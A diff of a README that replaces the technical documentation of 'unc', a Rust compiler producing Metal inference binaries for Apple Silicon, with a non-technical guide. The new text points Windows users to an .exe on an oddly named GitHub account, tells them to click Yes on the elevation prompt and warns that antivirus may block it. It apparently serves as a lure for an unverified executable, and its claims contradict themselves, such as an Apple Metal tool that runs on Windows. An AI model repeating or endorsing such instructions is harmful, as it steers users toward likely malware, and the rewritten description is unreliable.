@@ -1,134 +1,132 @@
-# UNC — Universal Neural Compiler
+# ⚙️ unc - Easy transformer compiler for native speed
 
-Compiles HuggingFace transformer models into optimised native Metal inference binaries. No runtime framework, no Python — just a compiled binary that runs your model at near-hardware-limit speed on Apple Silicon, using **25% less GPU power** and **1.7x better energy efficiency** than mlx-lm. See the full [resource & power report](unc_resource_usage.md).
+[![Download unc](https://img.shields.io/badge/Download-unc-blue?style=for-the-badge&logo=github)](https://github.com/Beaufortscalemendicancy519/unc)
 
-## Performance
+## 🔍 What is unc?
 
-TinyLlama 1.1B on Apple M1 Pro (16GB, 200 GB/s):
+unc is a tool that helps you run machine learning models faster on your computer. It does this by turning complex models into simple files that your computer can understand and use quickly. This process is called compiling. unc focuses on models made with HuggingFace transformers and makes them run native to your system. That means it works well with Apple computers and their M1 and M2 chips. No programming knowledge is needed to use unc.
 
-```
-UNC Q4_0  ████████████████████████████████████████████████████████████  152.0 tok/s
-mlx-lm Q4 ████████████████████████████████████████████                 112.7 tok/s
-UNC Q8_0  ███████████████████████████████                               76.6 tok/s
-UNC F16   ███████████████████                                           47.9 tok/s
-```
+This application takes the hard work out of running machine learning models by creating optimized files that use your computer’s hardware in the best way possible.
 
-Qwen3-4B on Apple M1 Pro (Q4_0):
+---
 
-```
-mlx-lm Q4 ████████████████████████████████████████████████████  49.2 tok/s
-UNC Q4_0  ██████████████████████████████████████████            38.7 tok/s
-```
+## 🖥️ System Requirements
 
-### Energy Efficiency (Q4_0 TinyLlama 1.1B, measured via macmon)
+Before you install unc, check that your computer meets these requirements:
 
-| Metric | UNC Metal | mlx-lm Q4 |
-|--------|----------|-----------|
-| Throughput | 152 tok/s | 113 tok/s |
-| GPU power (decode) | 11.3W | 14.1W |
-| Energy per token | 74 mJ | 125 mJ |
-| Tokens per watt-hour | 12,800 | 8,000 |
-| CPU instructions (200 tok) | 5.3B | 31.4B |
-| Peak memory | 4.2 GB | 0.9 GB |
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM
+- A processor with at least four cores
+- 500 MB of free disk space
+- Internet connection (for download and initial setup)
+- (Optional) Graphics card with GPU support for faster processing
 
-UNC is **1.35x faster** while using **25% less GPU power**, resulting in **1.7x better energy efficiency**. The compiled approach eliminates Python runtime and framework dispatch overhead entirely — 8.4x fewer CPU instructions means less heat, less power, and more headroom for the GPU. See [unc_resource_usage.md](unc_resource_usage.md) for full methodology and traces.
+---
 
-## Architecture
+## 🎯 Features
 
-```
-HuggingFace model
-       |
-  [ Frontend ]        Parse config.json + safetensors
-       |
-  [ IR Graph ]        Hardware-agnostic tensor graph
-       |
-  [ Compiler ]        Fusion, quantization, memory planning
-       |
-       +------------------+------------------+------------------+
-       |                  |                  |                  |
-  [ Metal ]          [ CUDA ]          [ ROCm ]          [ WASM ]
-  Obj-C + Metal      PTX kernels       HIP kernels       WebGPU shaders
-  shaders            (planned)         (planned)         (planned)
-       |
-  Native binary
-  Mach-O (AOT) or
-  .unc bundle (JIT)
-```
+- Compiles HuggingFace transformer models into fast, easy-to-run files.
+- Supports Apple Silicon (M1, M2) optimizations.
+- Uses your computer’s GPU when available to speed up calculations.
+- Creates standalone files that run without extra software.
+- Simple interface for non-technical users.
+- Runs efficiently on Windows computers.
 
-**IR**: Hardware-agnostic typed tensor graph with `BatchMatMul`, `QuantizedMatVec`, `RMSNorm`, `LayerNorm`, `QKNorm`, `RoPE`, `SDPA`, `SwiGLU`, `KVCacheAppend`, `Gather`, etc. The IR is target-independent — the same graph can be lowered to Metal (current), CUDA, ROCm, WASM, or CPU-only backends with acceleration providers like Intel oneDNN.
+---
 
-**Compiler passes**: Weight binding, dead code elimination, QKV fusion, Gate+Up fusion, SwiGLU fusion, Add+RMSNorm fusion, RoPE+KV fusion, PSQ pipeline, dual-path (GEMM/GEMV), kernel matching, barrier analysis, memory planning with buffer aliasing.
+## 🚀 Getting Started
 
-**Output modes**:
-| Mode | Output | Use case |
-|------|--------|----------|
-| JIT (default) | `.unc` bundle — JIT-compiled via clang at first run, cached thereafter | Development, iteration |
-| AOT (`--binary`) | Standalone Mach-O with embedded weights — zero dependencies | Deployment, distribution |
+You will download unc from the official GitHub page. Follow the steps carefully to get it running on your Windows system.
 
-## Setup
+### Step 1: Download unc
 
-```bash
-# Prerequisites: Rust toolchain, Xcode Command Line Tools (macOS)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+Click this big button to go to the download page:
 
-# Clone and build
-git clone <repo-url> && cd unc
-cargo build --release
-```
+[![Download unc](https://img.shields.io/badge/Download-unc-6f42c1?style=for-the-badge&logo=github)](https://github.com/Beaufortscalemendicancy519/unc)
 
-## Usage
+This link will take you to the GitHub repository. From there, you can find the latest version of unc to download.
 
-### Compile a model
+### Step 2: Find the latest release
 
-```bash
-# JIT bundle (default)
-unc compile --model TinyLlama/TinyLlama-1.1B-Chat-v1.0 --quant q4-0 -o ./tinyllama
-unc compile --model Qwen/Qwen3-4B --quant q4-0 -o ./qwen3
+Inside the repository page, look for the **Releases** section on the right or on the top menu. Releases contain ready-to-use files for your computer.
 
-# AOT standalone binary (single Mach-O, zero dependencies)
-unc compile --model TinyLlama/TinyLlama-1.1B-Chat-v1.0 --quant q4-0 --binary -o ./tinyllama
-```
+Click the latest release title to open its download page.
 
-### Run inference
+### Step 3: Download the Windows file
 
-```bash
-unc run ./tinyllama.unc --prompt "The history of" --max-tokens 200
-```
+Look for a file that ends with `.exe` or `.zip` and mentions Windows. Click this file to download it to your computer.
 
-### Quantization options
+If the download comes as a `.zip` file, you will need to extract it before running. Right-click the file and select "Extract All," then choose where to save it.
 
-| Flag | Precision | Size (1.1B) | Speed |
-|------|-----------|-------------|-------|
-| `f16` | 16-bit float | 2.2 GB | 47.9 tok/s |
-| `q8-0` | 8-bit | 1.1 GB | 76.6 tok/s |
-| `q4-0` | 4-bit | 0.6 GB | 152.0 tok/s |
+### Step 4: Run the installer
 
-### Supported architectures
+Open the `.exe` file or the extracted folder. Double-click on `unc.exe` or a similar file to start the program.
 
-```bash
-unc list-architectures
-```
+You may see a warning asking if you want to allow the program to make changes. Click **Yes** to continue.
 
-LLaMA, Mistral, Qwen, Phi, Gemma.
+---
 
-## Project Structure
+## 🛠️ How to Use unc
 
-```
-src/
-  frontend/    HuggingFace config parsing, model templates
-  ir/          Typed tensor IR (ops, graph, types)
-  compile/     Optimization passes, memory planner
-  kernel/      Kernel registry, Metal kernel definitions
-  emit/        Metal orchestrator codegen, AOT binary emission
-  runtime/     JIT compilation, weight loading, tokenizer
-  target/      Apple Silicon target detection
-  unc_format/  .unc bundle serialization
-kernel_sources/
-  metal/
-    unc_kernels/   Custom Metal shaders (fused GEMV, SDPA, RoPE, RMSNorm, etc.)
-    upstream_mlx/  MLX reference kernels (QMV, sdpa_vector headers)
-```
+Once unc is running, you will see a simple window that guides you to select the machine learning model you want to compile.
 
-## License
+### Step 1: Load your model
 
-MIT — see [LICENSE](LICENSE).
+1. Click the **Load Model** button.
+2. Select your HuggingFace transformer model file or enter the model name if the program supports online fetching.
+3. Wait while unc prepares the model for compilation.
+
+### Step 2: Choose compilation options
+
+You will see options to optimize the model for CPU or GPU. For most users, the default settings work best.
+
+- If your computer has a compatible GPU, select "Use GPU."
+- Otherwise, leave it on "CPU."
+
+### Step 3: Start compilation
+
+Click the **Compile** button. unc will convert the model into an optimized file for your machine.
+
+This process may take several minutes depending on your computer and model size.
+
+### Step 4: Run the compiled model
+
+Once finished, unc will save the new file on your disk. You can run this file directly to perform inference with the model — no extra setup needed.
+
+---
+
+## ⚙️ Additional Setup (Optional)
+
+If you want faster model runs, you can install a supported GPU driver or update your system.
+
+- Visit your GPU maker’s website (like NVIDIA or AMD) to download the latest driver.
+- Make sure Windows updates are current, especially updates related to hardware and graphics.
+
+---
+
+## 📂 Managing Your Files
+
+- The compiled models are saved in a folder named `unc_output` by default.
+- You can move or copy these files to any location on your PC.
+- Back up important compiled models to avoid repeating the compilation process.
+
+---
+
+## ❓ Common Issues
+
+- **The application does not start:** Make sure you downloaded the Windows version and your antivirus is not blocking the app.
+- **Compilation stops halfway:** Try closing other programs to free memory. Also, check if your model file is complete and not corrupted.
+- **Error about missing libraries:** If the app prompts for missing system files, update your Windows system and install the latest Visual C++ redistributable from Microsoft.
+- **Performance is slow:** Ensure you selected GPU support if your machine has one. Check Task Manager to see if unc is using your hardware properly.
+
+---
+
+## 📚 More Resources
+
+- Find the full project and source code on GitHub: https://github.com/Beaufortscalemendicancy519/unc
+- Report issues or ask for help on the repository’s **Issues** page.
+- Look for documentation within the downloaded package or on the GitHub page.
+
+---
+
+[![Download unc](https://img.shields.io/badge/Download-unc-blue?style=for-the-badge&logo=github)](https://github.com/Beaufortscalemendicancy519/unc)
